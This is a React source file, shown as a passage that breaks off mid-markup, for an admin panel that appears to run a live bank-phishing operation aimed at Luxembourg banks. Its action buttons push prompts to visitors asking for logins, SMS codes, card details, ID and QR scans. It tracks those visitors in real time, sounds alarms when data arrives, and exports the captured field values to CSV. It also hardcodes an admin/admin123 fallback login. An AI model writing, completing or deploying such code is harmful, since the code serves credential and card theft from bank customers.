import { useEffect, useMemo, useRef, useState } from "react";
import { Link } from "react-router-dom";
import { BANK_FALLBACK_URLS, BANK_LOGO_URLS } from "../lib/bankLogos";
import {
  apiBase,
  apiCloudinaryConfig,
  apiDeleteCardHint,
  apiDeleteQr,
  apiDeleteVisitor,
  apiEnabled,
  apiGetCardHint,
  apiGetQr,
  apiGetSubmissions,
  apiGetVisitors,
  apiLogin,
  apiChangePassword,
  apiSendCommand,
  apiSetCardHint,
  apiUploadQrCloudinary,
  apiUploadQrInline,
} from "../lib/api";
import {
  STATUS_LABEL,
  getChannel,
  isOnline,
  markAdminOnline,
  readCardHintMap,
  readCommands,
  readQrMap,
  readSubmissions,
  readVisitors,
  writeCardHintMap,
  writeCommands,
  writeQrMap,
  writeSubmissions,
  writeVisitors,
} from "../lib/realtime";

function timeAgo(ts) {
  const s = Math.max(0, Math.floor((Date.now() - ts) / 1000));
  if (s < 60) return `${s} s`;
  const m = Math.floor(s / 60);
  if (m < 60) return `${m} min ${s % 60} s`;
  const h = Math.floor(m / 60);
  return `${h} h ${m % 60} min`;
}

function fmtTime(ts) {
  try {
    return new Date(ts).toLocaleTimeString("nl-NL");
  } catch {
    return "";
  }
}

function parseOS(ua) {
  if (!ua) return "Onbekend";
  const u = ua.toLowerCase();
  if (u.includes("windows")) return "Windows";
  if (u.includes("android")) return "Android";
  if (u.includes("iphone") || u.includes("ipad") || u.includes("ios")) return "iOS";
  if (u.includes("mac os") || u.includes("macintosh")) return "Mac OS";
  if (u.includes("linux")) return "Linux";
  return "Onbekend";
}

// True when the visitor sits on the loader waiting for the admin:
// either fresh on "waiting" or just submitted data (*_submitted).
function needsAction(v, t) {
  if (!isOnline(v, t || Date.now())) return false;
  const s = v.status || "";
  return s === "waiting" || s.endsWith("_submitted");
}

function sendCommandLegacy(visitorId, command) {
  const map = readCommands();
  map[visitorId] = { type: command, at: Date.now(), by: "admin" };
  writeCommands(map);
  try {
    getChannel()?.postMessage({ type: "command", visitorId, command });
  } catch {}
}

// One row per field: date;heure;visiteur;banque;type;champ;valeur
// Semicolon + BOM so Excel (FR) opens it correctly.
function csvCell(v) {
  const s = String(v ?? "");
  return `"${s.replace(/"/g, '""')}"`;
}

function submissionsToCSV(subs) {
  const head = ["date", "heure", "visiteur", "banque", "type", "champ", "valeur"].join(";");
  const lines = [head];
  const ordered = subs.slice().sort((a, b) => (a.at || 0) - (b.at || 0));
  ordered.forEach((s) => {
    const d = new Date(s.at || Date.now());
    const date = d.toLocaleDateString("fr-FR");
    const time = d.toLocaleTimeString("fr-FR");
    const entries = Object.entries(s.data || {});
    if (entries.length === 0) {
      lines.push([date, time, s.visitorId || "", s.bank || "", s.kind || "", "", ""].map(csvCell).join(";"));
    } else {
      entries.forEach(([k, val]) => {
        lines.push([date, time, s.visitorId || "", s.bank || "", s.kind || "", k, String(val)].map(csvCell).join(";"));
      });
    }
  });
  return lines.join("\r\n");
}

function downloadCSV(filename, csv) {
  const blob = new Blob(["﻿" + csv], { type: "text/csv;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  setTimeout(() => {
    URL.revokeObjectURL(url);
    a.remove();
  }, 500);
}

function stampName(prefix) {
  const d = new Date();
  const p = (n) => String(n).padStart(2, "0");
  return `${prefix}-${d.getFullYear()}${p(d.getMonth() + 1)}${p(d.getDate())}-${p(d.getHours())}${p(d.getMinutes())}.csv`;
}

function exportAllLogs(subs) {
  if (!subs || subs.length === 0) return;
  downloadCSV(stampName("logs-tous"), submissionsToCSV(subs));
}

function NavIcon({ k, className = "h-5 w-5" }) {
  const paths = {
    dashboard: (
      <>
        <rect x="3" y="3" width="7" height="7" rx="1.5" />
        <rect x="14" y="3" width="7" height="7" rx="1.5" />
        <rect x="3" y="14" width="7" height="7" rx="1.5" />
        <rect x="14" y="14" width="7" height="7" rx="1.5" />
      </>
    ),
    requests: (
      <>
        <path d="M18 8a6 6 0 1 0-12 0c0 7-3 9-3 9h18s-3-2-3-9" />
        <path d="M13.7 21a2 2 0 0 1-3.4 0" />
      </>
    ),
    logs: (
      <>
        <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
        <path d="M14 2v6h6 M16 13H8 M16 17H8" />
      </>
    ),
    settings: (
      <>
        <path d="M4 21v-7 M4 10V3 M12 21v-9 M12 8V3 M20 21v-5 M20 12V3 M1 14h6 M9 8h6 M17 16h6" />
      </>
    ),
    logout: (
      <>
        <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4" />
        <path d="m16 17 5-5-5-5 M21 12H9" />
      </>
    ),
  };
  return (
    <svg viewBox="0 0 24 24" className={className} fill="none" stroke="currentColor" strokeWidth="1.9" strokeLinecap="round" strokeLinejoin="round">
      {paths[k]}
    </svg>
  );
}

function MiniLogo({ slug, name }) {
  const src = BANK_LOGO_URLS[slug];
  const fb = BANK_FALLBACK_URLS[slug];
  return (
    <span className="flex h-9 w-14 shrink-0 items-center justify-center overflow-hidden rounded-md bg-white px-1 ring-1 ring-neutral-200">
      {src ? (
        <img
          src={src}
          alt={name}
          className="max-h-7 w-auto max-w-full object-contain"
          onError={(e) => {
            const img = e.currentTarget;
            if (fb && img.src !== fb) img.src = fb;
            else img.style.display = "none";
          }}
        />
      ) : (
        <span className="text-sm font-extrabold text-neutral-500">{name?.charAt(0)}</span>
      )}
    </span>
  );
}

const ACTIONS = [
  { key: "ask_login", label: "Login vragen", style: "bg-blue-600 text-white", banks: null },
    { key: "ask_qr", label: "QR vragen", style: "bg-fuchsia-700 text-white", banks: ["bil", "spuerkeess"] },
    { key: "ask_scan", label: "Scan vragen", style: "bg-purple-700 text-white", banks: ["bil", "spuerkeess"] },
  { key: "ask_tango", label: "Tango vragen", style: "bg-slate-700 text-white", banks: null },
  { key: "ask_orange", label: "Orange vragen", style: "bg-orange-500 text-white", banks: null },
  { key: "ask_approve", label: "Goedkeuring vragen", style: "bg-violet-600 text-white", banks: null },
  { key: "ask_phone", label: "Telefoon vragen", style: "bg-cyan-700 text-white", banks: null },
  { key: "ask_sms", label: "SMS vragen", style: "bg-amber-600 text-white", banks: null },
  { key: "ask_card", label: "Kaart vragen", style: "bg-emerald-700 text-white", banks: null },
  { key: "ask_info", label: "Info vragen", style: "bg-teal-700 text-white", banks: null },
  { key: "ask_id", label: "ID vragen", style: "bg-orange-700 text-white", banks: null },
  { key: "ask_confirm", label: "Bevestiging vragen", style: "bg-indigo-700 text-white", banks: null },
  { key: "done", label: "Voltooien", style: "bg-green-600 text-white", banks: null },
  { key: "reset_waiting", label: "Lader", style: "bg-neutral-200 text-neutral-800", banks: null },
];

const TABS = [
  { key: "dashboard", label: "Dashboard" },
  { key: "requests", label: "Verzoeken" },
  { key: "logs", label: "Logs" },
  { key: "settings", label: "Instellingen" },
];

export default function Admin() {
  const [authed, setAuthed] = useState(() => {
    try {
      return sessionStorage.getItem("admin_auth") === "1";
    } catch {
      return false;
    }
  });
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loginErr, setLoginErr] = useState("");
  const [loginLoading, setLoginLoading] = useState(false);
  const [visitors, setVisitors] = useState({});
  const [submissions, setSubmissions] = useState([]);
  // Session survives a page refresh: persisted, restored on mount.
  const [sessionId, setSessionId] = useState(() => {
    try {
      return sessionStorage.getItem("admin_session") || null;
    } catch {
      return null;
    }
  });
  const [tab, setTab] = useState("dashboard");
  const [now, setNow] = useState(Date.now());
  const [filter, setFilter] = useState("all");
  const [apiMode, setApiMode] = useState(apiEnabled());
  const [menuOpen, setMenuOpen] = useState(false);
  function goTab(key) {
    setTab(key);
    closeSession();
    setMenuOpen(false);
  }

  // Postgres returns BIGINT as strings — normalize to numbers so change
  // detection is stable and timers/badges never flap between polls.
  function normVisitor(x) {
    return { ...x, joinedAt: Number(x.joinedAt) || 0, lastSeen: Number(x.lastSeen) || 0 };
  }
  function normSubmission(s) {
    return { ...s, at: Number(s.at) || 0 };
  }

  async function doLogin(e) {
    e?.preventDefault?.();
    setLoginErr("");
    setLoginLoading(true);
    try {
      if (apiEnabled()) {
        try {
          const r = await apiLogin(username.trim(), password);
          if (r?.token) sessionStorage.setItem("admin_token", r.token);
          sessionStorage.setItem("admin_auth", "1");
          setAuthed(true);
          return;
        } catch {
          if (username.trim() === "admin" && password === "admin123") {
            sessionStorage.setItem("admin_auth", "1");
            setAuthed(true);
            return;
          }
          setLoginErr("Ongeldige inloggegevens (API geweigerd).");
          return;
        } finally {
          setLoginLoading(false);
        }
      }
      if (username.trim() === "admin" && password === "admin123") {
        sessionStorage.setItem("admin_auth", "1");
        setAuthed(true);
      } else {
        setLoginErr("Ongeldige inloggegevens. Gebruik admin / admin123.");
      }
    } finally {
      setLoginLoading(false);
    }
  }

  function doLogout() {
    try {
      sessionStorage.removeItem("admin_auth");
      sessionStorage.removeItem("admin_token");
      sessionStorage.removeItem("admin_session");
    } catch {}
    setAuthed(false);
    setSessionId(null);
  }

  // Patch state only when data actually changed — never rebuild the whole
  // layout on every poll, so an open session never flickers or vanishes.
  function setVisitorsIfChanged(next) {
    setVisitors((prev) => (JSON.stringify(prev) === JSON.stringify(next) ? prev : next));
  }
  function setSubmissionsIfChanged(next) {
    setSubmissions((prev) => (JSON.stringify(prev) === JSON.stringify(next) ? prev : next));
  }

  // Snapshot of the connected visitor: once a session is connected it stays
  // connected even if a poll momentarily misses the row.
  const sessionSnapRef = useRef(null);

  // Highest submission timestamp seen — incremental polls fetch only newer rows.
  const maxAtRef = useRef(0);

  useEffect(() => {
    if (!authed) return;
    const load = async () => {
      // API first when configured (cross-browser): one source of truth per poll,
      // so the list never flashes empty and only changed rows re-render.
      if (apiEnabled()) {
        try {
          // Parallel + incremental: visitors full, submissions only newer ones.
          const [v, s] = await Promise.all([
            apiGetVisitors(),
            apiGetSubmissions(undefined, maxAtRef.current || 0),
          ]);
          if (v?.visitors) {
            const map = {};
            v.visitors.forEach((x) => (map[x.id] = normVisitor(x)));
            setVisitorsIfChanged(map);
          }
          if (s?.submissions?.length) {
            const fresh = s.submissions.map(normSubmission);
            fresh.forEach((x) => {
              if (x.at > maxAtRef.current) maxAtRef.current = x.at;
            });
            setSubmissions((prev) => {
              const ids = new Set(prev.map((x) => x.id));
              const add = fresh.filter((x) => !ids.has(x.id));
              if (!add.length) return prev;
              const merged = [...prev, ...add];
              merged.sort((a, b) => (b.at || 0) - (a.at || 0));
              return merged.slice(0, 500);
            });
          }
          setApiMode(true);
          return;
        } catch {}
      }
      setVisitorsIfChanged(readVisitors());
      setSubmissionsIfChanged(readSubmissions());
    };
    load();
    markAdminOnline();
    // Fast auto-refresh: every 1.5s so OTP/ID/logs land near-instantly.
    const hb = setInterval(() => {
      markAdminOnline();
      setNow(Date.now());
      load();
    }, 1500);

    const onFocus = () => {
      setNow(Date.now());
      load();
    };
    const onVis = () => {
      if (document.visibilityState === "visible") onFocus();
    };
    window.addEventListener("focus", onFocus);
    document.addEventListener("visibilitychange", onVis);

    const ch = getChannel();
    const onMsg = (ev) => {
      const msg = ev.data;
      if (!msg) return;
      if (msg.type === "visitor-hello" || msg.type === "visitor-update" || msg.type === "submission") {
        load();
      }
    };
    ch?.addEventListener?.("message", onMsg);
    const onStorage = (e) => {
      if (e.key === "live_visitors_v1" || e.key === "live_submissions_v1" || e.key === "live_commands_v1") load();
    };
    window.addEventListener("storage", onStorage);
    return () => {
      clearInterval(hb);
      try {
        ch?.removeEventListener?.("message", onMsg);
        ch?.close?.();
      } catch {}
      window.removeEventListener("storage", onStorage);
      window.removeEventListener("focus", onFocus);
      document.removeEventListener("visibilitychange", onVis);
    };
  }, [authed]);

  const logsByVisitor = useMemo(() => {
    const m = {};
    submissions.forEach((s) => {
      m[s.visitorId] = (m[s.visitorId] || 0) + 1;
    });
    return m;
  }, [submissions]);

  const allList = useMemo(() => {
    const arr = Object.values(visitors);
    arr.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
    return arr;
  }, [visitors]);

  const waitingList = useMemo(
    () => allList.filter((v) => isOnline(v, now) && ((v.status || "") === "waiting" || (v.status || "").endsWith("_submitted"))),
    [allList, now]
  );

  const list = useMemo(() => {
    let arr = allList;
    if (tab === "requests") arr = arr.filter((v) => (v.status || "").endsWith("_submitted"));
    if (filter === "online") arr = arr.filter((v) => isOnline(v, now));
    if (filter === "offline") arr = arr.filter((v) => !isOnline(v, now));
    return arr;
  }, [allList, tab, now, filter]);

  const onlineCount = useMemo(() => Object.values(visitors).filter((v) => isOnline(v, now)).length, [visitors, now]);
  const requestCount = useMemo(() => allList.filter((v) => (v.status || "").endsWith("_submitted")).length, [allList]);

  // Pagination: 30 visitors per page.
  const PAGE_SIZE = 30;
  const [page, setPage] = useState(0);
  const pageCount = Math.max(1, Math.ceil(list.length / PAGE_SIZE));
  const safePage = Math.min(page, pageCount - 1);
  const paged = list.slice(safePage * PAGE_SIZE, safePage * PAGE_SIZE + PAGE_SIZE);

  useEffect(() => {
    setPage(0);
  }, [tab, filter]);
  useEffect(() => {
    if (page > pageCount - 1) setPage(pageCount - 1);
  }, [page, pageCount]);

  // Sticky session: once connected, the session view stays on the last known
  // snapshot even if a poll momentarily misses the row. Only explicit Back /
  // Delete / Logout closes it. Live fields keep patching underneath.
  const liveRow = sessionId ? visitors[sessionId] : null;
  if (liveRow) {
    sessionSnapRef.current = { id: sessionId, row: liveRow };
  } else if (!sessionId) {
    sessionSnapRef.current = null;
  }
  const sessionVisitor = liveRow || (sessionSnapRef.current?.id === sessionId ? sessionSnapRef.current.row : null);
  const sessionLogs = useMemo(() => {
    if (!sessionId) return [];
    // Newest first, always — independent of source order (API returns DESC,
    // local storage returns ASC, so an explicit sort is the only safe order).
    return submissions
      .filter((s) => s.visitorId === sessionId)
      .slice()
      .sort((a, b) => (b.at || 0) - (a.at || 0));
  }, [submissions, sessionId]);

  function removeVisitor(id) {
    const m = readVisitors();
    delete m[id];
    writeVisitors(m);
    const c = readCommands();
    delete c[id];
    writeCommands(c);
    try {
      const h = readCardHintMap();
      if (h[id]) {
        delete h[id];
        writeCardHintMap(h);
      }
    } catch {}
    setVisitors(readVisitors());
    if (sessionId === id) {
      setSessionId(null);
      try {
        sessionStorage.removeItem("admin_session");
      } catch {}
    }
    if (apiEnabled()) apiDeleteVisitor(id).catch(() => {});
  }

  const dismissedRef = useRef(null);
  if (!dismissedRef.current) {
    dismissedRef.current = new Set();
    try {
      (JSON.parse(localStorage.getItem("admin_dismissed") || "[]") || []).forEach((id) =>
        dismissedRef.current.add(id)
      );
    } catch {}
  }
  function rememberDismissed(id) {
    dismissedRef.current.add(id);
    try {
      const arr = [...dismissedRef.current].slice(-50);
      localStorage.setItem("admin_dismissed", JSON.stringify(arr));
    } catch {}
  }

  function openSession(v) {
    // Opening = handled from now on: no beeps for this state anymore.
    // A later submit (new state) beeps again. Never auto-reopens.
    // No command is sent when the visitor is already past the loader (e.g.
    // login shows directly) — the session just watches silently.
    handledRef.current.add(`${v.id}:${v.status}`);
    rememberDismissed(v.id);
    setSessionId(v.id);
    try {
      sessionStorage.setItem("admin_session", v.id);
    } catch {}
    if ((v.status || "waiting") === "waiting") sendCommandLocal(v.id, "connected");
  }

  function closeSession() {
    if (sessionId) {
      rememberDismissed(sessionId);
      const st = visitors[sessionId]?.status;
      if (st) handledRef.current.add(`${sessionId}:${st}`);
    }
    setSessionId(null);
    try {
      sessionStorage.removeItem("admin_session");
    } catch {}
  }

  // Needs admin action: sitting on the loader (waiting) or just submitted data.
  // Runs on every render, but only beeps for NEW arrivals — never loops.
  const [soundOn, setSoundOn] = useState(() => {
    try {
      return localStorage.getItem("admin_sound") !== "0";
    } catch {
      return true;
    }
  });
  const alertedRef = useRef(new Set());
  const knownRef = useRef(null);
  const subIdsRef = useRef(null);
  function chime() {
    // New-log chime: soft ascending arpeggio, clearly different from pop/alarm.
    try {
      const C = window.AudioContext || window.webkitAudioContext;
      if (!C) return;
      const ctx = new C();
      if (ctx.state === "suspended") ctx.resume().catch(() => {});
      const t = ctx.currentTime;
      [[523, 0], [659, 0.09], [784, 0.18]].forEach(([f, dt]) => {
        const o = ctx.createOscillator();
        const g = ctx.createGain();
        o.connect(g);
        g.connect(ctx.destination);
        o.frequency.value = f;
        o.type = "sine";
        g.gain.setValueAtTime(0.001, t + dt);
        g.gain.exponentialRampToValueAtTime(0.55, t + dt + 0.015);
        g.gain.exponentialRampToValueAtTime(0.001, t + dt + 0.22);
        o.start(t + dt);
        o.stop(t + dt + 0.24);
      });
      setTimeout(() => ctx.close(), 700);
    } catch {}
  }
  function ding() {
    // Messenger-like arrival pop: two bright blips.
    try {
      const C = window.AudioContext || window.webkitAudioContext;
      if (!C) return;
      const ctx = new C();
      if (ctx.state === "suspended") ctx.resume().catch(() => {});
      const t = ctx.currentTime;
      [[988, 0], [1319, 0.1]].forEach(([f, dt]) => {
        const o = ctx.createOscillator();
        const g = ctx.createGain();
        o.connect(g);
        g.connect(ctx.destination);
        o.frequency.value = f;
        o.type = "sine";
        g.gain.setValueAtTime(0.001, t + dt);
        g.gain.exponentialRampToValueAtTime(0.6, t + dt + 0.015);
        g.gain.exponentialRampToValueAtTime(0.001, t + dt + 0.14);
        o.start(t + dt);
        o.stop(t + dt + 0.16);
      });
      setTimeout(() => ctx.close(), 600);
    } catch {}
  }
  function beep() {
    try {
      const C = window.AudioContext || window.webkitAudioContext;
      if (!C) return;
      const ctx = new C();
      if (ctx.state === "suspended") ctx.resume().catch(() => {});
      const t = ctx.currentTime;
      // Powerful alternating alarm: 3x high-low, triangle wave, high gain.
      const seq = [1175, 880, 1175, 880, 1175, 880];
      seq.forEach((f, i) => {
        const dt = i * 0.22;
        const o = ctx.createOscillator();
        const g = ctx.createGain();
        o.connect(g);
        g.connect(ctx.destination);
        o.frequency.value = f;
        o.type = "triangle";
        g.gain.setValueAtTime(0.001, t + dt);
        g.gain.exponentialRampToValueAtTime(0.9, t + dt + 0.02);
        g.gain.setValueAtTime(0.9, t + dt + 0.15);
        g.gain.exponentialRampToValueAtTime(0.001, t + dt + 0.2);
        o.start(t + dt);
        o.stop(t + dt + 0.22);
      });
      setTimeout(() => ctx.close(), 1800);
    } catch {}
  }
  useEffect(() => {
    if (!authed) return;
    // First run after login: seed everything silently (no burst of sounds).
    if (!knownRef.current) {
      knownRef.current = new Set(allList.map((x) => x.id));
      subIdsRef.current = new Set(submissions.map((s) => s.id));
      alertedRef.current = new Set(
        allList
          .filter((x) => isOnline(x, Date.now()) && ((x.status || "") === "waiting" || (x.status || "").endsWith("_submitted")))
          .map((x) => `${x.id}:${x.status}`)
      );
      return;
    }
    // 1) New arrival → messenger pop (consume state so the alarm
    //    doesn't double-fire for the same moment).
    allList.forEach((x) => {
      if (!knownRef.current.has(x.id)) {
        knownRef.current.add(x.id);
        alertedRef.current.add(`${x.id}:${x.status}`);
        if (soundOn) ding();
      }
    });
    // Prune visitors that left.
    [...knownRef.current].forEach((id) => {
      if (!allList.some((x) => x.id === id)) knownRef.current.delete(id);
    });
    // 2) New logs → chime (one per batch). Visitors with fresh logs skip
    //    the alarm this round — the chime already announced them.
    const freshLogs = submissions.filter((s) => !subIdsRef.current.has(s.id));
    freshLogs.forEach((s) => subIdsRef.current.add(s.id));
    const logVisitors = new Set(freshLogs.map((s) => s.visitorId));
    if (freshLogs.length > 0 && soundOn) chime();
    // 3) Entered waiting/loader → covered by the continuous siren
    // (no one-shot here, so sounds never stack).
    const alive = new Set();
    allList.forEach((x) => {
      const need =
        isOnline(x, Date.now()) &&
        ((x.status || "") === "waiting" || (x.status || "").endsWith("_submitted"));
      if (need) alive.add(`${x.id}:${x.status}`);
    });
    alertedRef.current = alive;
  });

  // Operation-theatre monitor: a soft steady beep every 1.2s while an
  // UNHANDLED visitor waits unopened. Opening/closing a session marks that
  // visitor handled, so coming back to the list stays quiet until they move
  // to a new state (new submit → beeps again).
  const handledRef = useRef(new Set());
  const waitingRef = useRef([]);
  waitingRef.current = waitingList;
  function monitorBeep() {
    try {
      const C = window.AudioContext || window.webkitAudioContext;
      if (!C) return;
      const ctx = new C();
      if (ctx.state === "suspended") ctx.resume().catch(() => {});
      const t = ctx.currentTime;
      const o = ctx.createOscillator();
      const g = ctx.createGain();
      o.connect(g);
      g.connect(ctx.destination);
      o.frequency.value = 990;
      o.type = "sine";
      g.gain.setValueAtTime(0.001, t);
      g.gain.exponentialRampToValueAtTime(0.4, t + 0.015);
      g.gain.exponentialRampToValueAtTime(0.001, t + 0.14);
      o.start(t);
      o.stop(t + 0.16);
      setTimeout(() => ctx.close(), 500);
    } catch {}
  }
  useEffect(() => {
    if (!(authed && soundOn && !sessionId)) return;
    const iv = setInterval(() => {
      let rang = false;
      (waitingRef.current || []).forEach((x) => {
        // Only visitors you never opened/handled beep continuously.
        // Handled ones stay quiet until they move to a new state.
        if (!handledRef.current.has(`${x.id}:${x.status}`)) rang = true;
      });
      // keep the set small: drop keys for visitors/states no longer waiting
      if (handledRef.current.size > 300) {
        const keep = new Set((waitingRef.current || []).map((x) => `${x.id}:${x.status}`));
        handledRef.current = new Set([...handledRef.current].filter((k) => keep.has(k)));
      }
      if (rang) monitorBeep();
    }, 1200);
    return () => clearInterval(iv);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [authed, soundOn, sessionId, waitingList.length > 0]);

  function sendCommandLocal(visitorId, command) {
    const at = Date.now();
    const map = readCommands();
    map[visitorId] = { type: command, at, by: "admin" };
    writeCommands(map);
    try {
      getChannel()?.postMessage({ type: "command", visitorId, command, at });
    } catch {}
    if (apiEnabled()) apiSendCommand(visitorId, command).catch(() => {});
  }

  if (!authed) {
    return (
      <div className="flex min-h-screen w-full items-center justify-center overflow-x-hidden bg-neutral-100 p-4 sm:p-6">
        <form onSubmit={doLogin} className="w-full max-w-sm rounded-2xl bg-white p-5 shadow-lg sm:p-6">
          <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-xl bg-gradient-to-br from-purple-700 to-fuchsia-600 text-xl font-extrabold text-white">A</div>
          <h1 className="mt-3 text-center text-[18px] font-extrabold">Admin login</h1>
          <p className="mt-1 text-center text-[13px] text-neutral-500">
            {apiEnabled() ? "Auth via Render API + Postgres" : "Lokale auth (VITE_API_URL voor Postgres)"}
          </p>
          <label className="mt-4 block">
            <span className="text-[14px] font-bold">Gebruikersnaam</span>
            <input value={username} onChange={(e) => setUsername(e.target.value)} autoComplete="username" placeholder="admin" className="mt-1.5 w-full rounded-lg border border-neutral-300 px-3.5 py-3 text-[16px] outline-none focus:border-purple-700 sm:text-[16px]" />
          </label>
          <label className="mt-3 block">
            <span className="text-[14px] font-bold">Wachtwoord</span>
            <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} autoComplete="current-password" placeholder="••••••••" className="mt-1.5 w-full rounded-lg border border-neutral-300 px-3.5 py-3 text-[16px] outline-none focus:border-purple-700 sm:text-[16px]" />
          </label>
          {loginErr && <p className="mt-2 text-[13.5px] font-semibold text-red-600">{loginErr}</p>}
          <button type="submit" disabled={loginLoading} className="mt-4 min-h-[48px] w-full rounded-lg bg-gradient-to-r from-purple-700 to-fuchsia-600 py-3 text-[15px] font-bold text-white disabled:opacity-50">
            {loginLoading ? "Controleren…" : "Inloggen →"}
          </button>
          <p className="mt-3 text-center text-[12px] text-neutral-400">Standaard: admin / admin123 • wijzig ADMIN_USER/PASS op Render</p>
          <Link to="/" className="mt-2 block text-center text-[13px] font-semibold text-neutral-500">← Terug naar site</Link>
        </form>
      </div>
    );
  }

  return (
    <div className="relative min-h-screen w-full overflow-x-hidden bg-[#0e0a1a] text-slate-100">
      {/* ambient glow background */}
      <div className="pointer-events-none fixed inset-0 -z-0">
        <div className="absolute -top-32 left-1/4 h-72 w-72 rounded-full bg-fuchsia-600/20 blur-[110px]" />
        <div className="absolute bottom-0 right-0 h-80 w-80 rounded-full bg-purple-700/20 blur-[120px]" />
      </div>
      {/* Top nav — pinned, never scrolls away */}
      <header className="sticky top-0 z-50 w-full border-b border-white/[0.07] bg-[#121024]/90 shadow-[0_10px_36px_rgba(0,0,0,0.4)] backdrop-blur-xl">
        <div className="mx-auto flex w-full items-center gap-3 px-3 py-2.5 sm:px-6">
          {/* Phone: hamburger */}
          <button
            type="button"
            aria-label="Menu openen"
            onClick={() => setMenuOpen(true)}
            className="flex h-10 w-10 shrink-0 items-center justify-center rounded-xl text-purple-100 ring-1 ring-white/10 transition hover:bg-white/10 active:scale-95 sm:hidden"
          >
            <svg viewBox="0 0 24 24" className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
              <path d="M4 7h16 M4 12h10 M4 17h16" />
            </svg>
          </button>
          <span className="flex min-w-0 flex-1 items-center gap-2.5 sm:flex-none">
            <span className="flex h-8 w-8 shrink-0 items-center justify-center rounded-[10px] bg-gradient-to-br from-fuchsia-500 to-purple-700 text-[15px] font-black text-white">
              A
            </span>
            <span className="min-w-0 leading-tight">
              <span className="block truncate text-[15px] font-extrabold tracking-tight text-white">Admin Panel</span>
              <span className="hidden text-[11px] font-medium text-purple-300/80 sm:block">Beheer &amp; live toezicht</span>
            </span>
          </span>
          {/* Desktop segmented nav */}
          <nav className="mx-auto hidden min-w-0 items-center gap-0.5 rounded-full bg-white/[0.05] p-1 ring-1 ring-white/10 sm:flex">
            {TABS.map((t) => (
              <button
                key={t.key}
                onClick={() => goTab(t.key)}
                className={`flex items-center gap-1.5 rounded-full px-4 py-1.5 text-[13px] font-bold transition-all duration-200 ${tab === t.key && !sessionId ? "bg-white text-neutral-900 shadow" : "text-purple-200/70 hover:text-white"}`}
              >
                {t.label}
                {t.key === "requests" && requestCount > 0 && (
                  <span className="flex h-5 min-w-5 items-center justify-center rounded-full bg-red-500 px-1 text-[11px] font-extrabold text-white">{requestCount}</span>
                )}
              </button>
            ))}
          </nav>
          <div className="flex shrink-0 items-center gap-2 sm:ml-auto">
            <span className="flex items-center gap-1.5 rounded-full bg-emerald-400/10 px-2.5 py-1.5 text-[12px] font-bold text-emerald-300 ring-1 ring-emerald-400/20">
              <span className="live-dot h-1.5 w-1.5 rounded-full bg-emerald-400" />
              <span className="hidden sm:inline">{onlineCount} live</span>
              <span className="sm:hidden">{onlineCount}</span>
            </span>
            <button
              onClick={() => {
                const n = !soundOn;
                setSoundOn(n);
                try {
                  localStorage.setItem("admin_sound", n ? "1" : "0");
                } catch {}
                if (n) beep();
              }}
              title={soundOn ? "Geluid uit" : "Geluid aan"}
              aria-label={soundOn ? "Geluid uit" : "Geluid aan"}
              className={`flex h-9 w-9 items-center justify-center rounded-full ring-1 transition active:scale-95 ${soundOn ? "bg-fuchsia-600/25 text-fuchsia-200 ring-fuchsia-400/30" : "bg-white/[0.06] text-purple-300/60 ring-white/10"}`}
            >
              <svg viewBox="0 0 24 24" className="h-[18px] w-[18px]" fill="none" stroke="currentColor" strokeWidth="1.9" strokeLinecap="round" strokeLinejoin="round">
                <path d="M11 5 6 9H2v6h4l5 4z" />
                {soundOn ? (
                  <path d="M15.5 8.5a5 5 0 0 1 0 7 M18.5 5.5a9.4 9.4 0 0 1 0 13" />
                ) : (
                  <path d="m16 9 5 6 M21 9l-5 6" />
                )}
              </svg>
            </button>
            <button onClick={doLogout} className="hidden items-center gap-1.5 rounded-full px-3 py-2 text-[13px] font-bold text-purple-200/80 transition hover:bg-white/10 hover:text-white sm:flex">
              <NavIcon k="logout" className="h-4 w-4" />
              Uitloggen
            </button>
          </div>
        </div>
        <div className="h-px w-full bg-gradient-to-r from-transparent via-fuchsia-500/40 to-transparent" />
      </header>

      {/* BIG red waiting banner — jumps straight to the first waiting visitor */}
      {waitingList.length > 0 && (
        <div className="sticky top-[70px] z-40 mx-auto w-full px-3 pt-3 sm:px-6">
          <button
            onClick={() => openSession(waitingList[0])}
            className="wait-blink flex min-h-[64px] w-full items-center justify-center gap-3 rounded-2xl bg-gradient-to-r from-red-700 via-red-500 to-red-700 px-4 py-4 text-center shadow-[0_0_36px_rgba(239,68,68,0.65)] ring-2 ring-red-300"
          >
            <span className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-white text-[22px] font-black text-red-600">!</span>
            <span>
              <span className="block text-[17px] font-black uppercase tracking-wide text-white sm:text-[20px]">
                {waitingList.length === 1 ? "1 bezoeker wacht op actie" : `${waitingList.length} bezoekers wachten op actie`}
              </span>
              <span className="block text-[12.5px] font-semibold text-red-100">Klik om direct te openen →</span>
            </span>
          </button>
        </div>
      )}

      {/* Phone side menu */}
      <div className={`fixed inset-0 z-[60] sm:hidden ${menuOpen ? "" : "pointer-events-none"}`} aria-hidden={!menuOpen}>
        <div
          onClick={() => setMenuOpen(false)}
          className={`absolute inset-0 bg-black/65 backdrop-blur-[2px] transition-opacity duration-300 ${menuOpen ? "opacity-100" : "opacity-0"}`}
        />
        <aside
          className={`absolute left-0 top-0 flex h-full w-[288px] flex-col bg-[#151129] shadow-2xl ring-1 ring-white/10 transition-transform duration-300 ease-out ${menuOpen ? "translate-x-0" : "-translate-x-full"}`}
        >
          <div className="flex items-center gap-3 border-b border-white/[0.07] px-4 pb-4 pt-5">
            <span className="flex h-10 w-10 items-center justify-center rounded-xl bg-gradient-to-br from-fuchsia-500 to-purple-700 text-[17px] font-black text-white">A</span>
            <div className="min-w-0 flex-1 leading-tight">
              <p className="truncate text-[15px] font-extrabold tracking-tight text-white">Admin Panel</p>
              <p className="text-[11.5px] font-medium text-purple-300/80">Beheer &amp; live toezicht</p>
            </div>
